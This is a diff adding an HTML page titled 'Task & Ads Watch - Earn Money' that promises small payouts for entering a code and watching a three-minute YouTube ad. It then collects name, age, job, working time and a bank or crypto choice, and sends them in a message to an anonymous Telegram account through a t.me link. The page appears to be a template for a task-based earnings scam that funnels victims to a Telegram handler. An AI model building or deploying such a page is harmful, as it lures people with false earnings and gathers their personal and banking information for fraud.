@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Task & Ads Watch - Earn Money</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #4CAF50;
+            padding: 20px;
+            text-align: center;
+            color: white;
+        }
+        .container {
+            width: full;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #333;
+        }
+        .task-item {
+            background-color: #e7e7e7;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .hidden {
+            display: none;
+        }
+        form {
+            margin: 20px 0;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input[type="text"], select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        iframe {
+            width: 100%;
+            height: 315px;
+            border: none;
+        }
+        .marquee {
+            margin: 20px 0;
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px;
+            font-size: 1.2em;
+            text-align: center;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+    <script>
+        let submittedCode = '';
+        let submittedTime = '';
+
+        // Task 1 Form Handling
+        function showForm() {
+            document.getElementById('task-form').classList.remove('hidden');
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            const codeInput = document.getElementById('code-input').value;
+            if (codeInput) {
+                submittedCode = codeInput;
+                const currentDateTime = new Date();
+                submittedTime = currentDateTime.toLocaleString(); // Get current date and time
+
+                document.getElementById('submitted-code').textContent = `You Earned Starting Code: ${submittedCode}`;
+                document.getElementById('submitted-time').textContent = `Submitted on: ${submittedTime}`;
+                document.getElementById('submitted-record').classList.remove('hidden');
+                document.getElementById('task-form').classList.add('hidden');
+
+                // Fill in the code and time in the withdraw form
+                document.getElementById('submitted-code-withdraw').textContent = `Earned Starting Code: ${submittedCode}`;
+                document.getElementById('submitted-time-withdraw').textContent = `Submitted on: ${submittedTime}`;
+            }
+        }
+
+        // Task 2 - Watch Video Handling
+        function startVideo() {
+            document.getElementById('video-container').classList.remove('hidden');
+
+            // After 3 minutes (180 seconds), show the withdraw form
+            setTimeout(function () {
+                document.getElementById('withdraw-form-container').classList.remove('hidden');
+            }, 180000); // 180,000 milliseconds = 3 minutes
+        }
+
+        // Generate Telegram message link
+        function sendTelegram() {
+            const name = document.getElementById('name').value;
+            const age = document.getElementById('age').value;
+            const job = document.getElementById('job').value;
+            const workingTime = document.getElementById('working-time').value;
+            const bankDetails = document.getElementById('bank-details').value;
+
+            const message = `Withdraw Request:\n\nName: ${name}\nAge: ${age}\nCurrent Job: ${job}\nWorking Time: ${workingTime}\nWithdraw Bank Details: ${bankDetails}\n\nEarned Starting Code: ${submittedCode}\nSubmitted on: ${submittedTime}`;
+
+            const telegramUrl = `https://t.me/Bacidation2340849946311?text=${encodeURIComponent(message)}`;
+
+            // Redirect to Telegram link
+            window.open(telegramUrl, '_blank');
+        }
+    </script>
+</head>
+<body>
+    <header>
+        <h1>Task & Ads Watch - Earn Money</h1>
+    </header>
+    
+    <div class="container">
+        <h2>Available Tasks</h2>
+        
+        <!-- Task 1: Click to TaskCard -->
+        <div class="task-item">
+            <h3>Task 1: Click to Start Task</h3>
+            <p>Reward: $0.50</p>
+            <a href="#" class="button" onclick="showForm()">Click to TaskCard</a>
+        </div>
+
+        <!-- Hidden form initially for Task 1 -->
+        <div id="task-form" class="hidden">
+            <h3>Fill in the form to start earning</h3>
+            <form onsubmit="handleSubmit(event)">
+                <label for="code-input">Enter Starting Code:</label>
+                <input type="text" id="code-input" placeholder="Enter your code here" required>
+                <button type="submit" class="button">Submit Code</button>
+            </form>
+        </div>
+
+        <!-- Display submitted record for Task 1 -->
+        <div id="submitted-record" class="hidden">
+            <h3>Submitted Record</h3>
+            <p id="submitted-code"></p>
+            <p id="submitted-time"></p>
+        </div>
+
+        <!-- Task 2: Watch 3-Minute Video -->
+        <div class="task-item">
+            <h3>Task 2: Watch Video Ad</h3>
+            <p>Reward: $1.00</p>
+            <a href="#" class="button" onclick="startVideo()">Start Watching</a>
+        </div>
+
+        <!-- Video container, initially hidden -->
+        <div id="video-container" class="hidden">
+            <h3>Watch this 3-Minute Ad</h3>
+            <iframe id="ad-video" src="https://www.youtube.com/embed/va0_Zopy5ts?autoplay=1&controls=0" allow="autoplay"></iframe>
+        </div>
+
+        <!-- Withdraw Form (hidden initially until video is done) -->
+        <div id="withdraw-form-container" class="hidden">
+            <h3>Withdraw Request</h3>
+            
+            <!-- Show submitted code and time -->
+            <p id="submitted-code-withdraw"></p>
+            <p id="submitted-time-withdraw"></p>
+
+            <form id="withdraw-form">
+                <label for="name">Name:</label>
+                <input type="text" id="name" required>
+
+                <label for="age">Age:</label>
+                <input type="text" id="age" required>
+
+                <label for="job">Current Job:</label>
+                <input type="text" id="job" required>
+
+                <label for="working-time">Working Time:</label>
+                <input type="text" id="working-time" required>
+
+                <label for="bank-details">Withdraw Bank Details (India Banks or Crypto):</label>
+                <select id="bank-details" required>
+                    <option value="State Bank of India">State Bank of India</option>
+                    <option value="HDFC Bank">HDFC Bank</option>
+                    <option value="ICICI Bank">ICICI Bank</option>
+                    <option value="Crypto (Bitcoin, USDT)">Crypto (Bitcoin, USDT)</option>
+                </select>
+
+                <button type="button" class="button" onclick="sendTelegram()">Withdraw Request</button>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2024 Task & Ads Watch - All Rights Reserved</p>
+    </footer>
+</body>
+</html>
